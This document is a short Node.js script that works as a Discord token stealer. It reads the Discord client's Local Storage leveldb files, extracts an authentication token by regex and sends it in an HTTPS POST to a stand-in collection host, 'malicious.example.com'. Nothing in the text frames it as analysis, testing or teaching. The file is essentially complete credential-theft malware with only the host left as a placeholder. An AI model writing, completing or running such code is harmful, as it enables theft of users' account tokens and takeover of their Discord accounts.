const https = require('https');
const fs = require('fs');
const path = require('path');

function getDiscordToken() {
  const localStoragePath = path.join(process.env.APPDATA, 'Discord', 'Local Storage', 'leveldb');
  const files = fs.readdirSync(localStoragePath);
  for (const file of files) {
    if (file.endsWith('.ldb')) {
      const content = fs.readFileSync(path.join(localStoragePath, file), 'utf8');
      const match = content.match(/["]([\w-]{24}\.[\w-]{6}\.[\w-]{27})["]/);
      if (match) {
        return match[1];
      }
    }
  }
  return null;
}

const token = getDiscordToken();
if (token) {
  const data = JSON.stringify({ token });
  const options = {
    hostname: 'malicious.example.com',
    port: 443,
    path: '/api/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };
  const req = https.request(options, (res) => {});
  req.write(data);
  req.end();
}

